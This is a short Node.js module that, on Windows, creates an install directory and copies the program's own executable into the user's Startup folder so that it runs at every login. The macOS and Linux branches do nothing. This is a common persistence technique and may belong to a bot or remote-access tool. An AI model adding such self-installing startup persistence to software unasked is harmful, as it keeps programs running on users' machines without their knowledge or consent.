const fs = require("fs");
const config = require("../config");
const identification = require("./identification");

function windowsInstallation() {
  try {

    if (!fs.existsSync(config.windowsInstallPath)) {
      fs.mkdirSync(config.windowsInstallPath, { recursive: true });

      fs.copyFile(
        `./${config.common.binName}.exe`,
        `${process.env.APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${config.common.binName}.exe`, (error) => {
          if (error) {
            console.log(error);
          }
        });

    }

  } catch (error) {
    console.log(error)
  }
}

function installation() {
  if (identification.platform === "win32") {
    windowsInstallation();
  } else if (identification.platform === "darwin") {
    return "";
  } else if (identification.platform === "linux") {
    return "";
  }
  return "";
}

module.exports = installation;
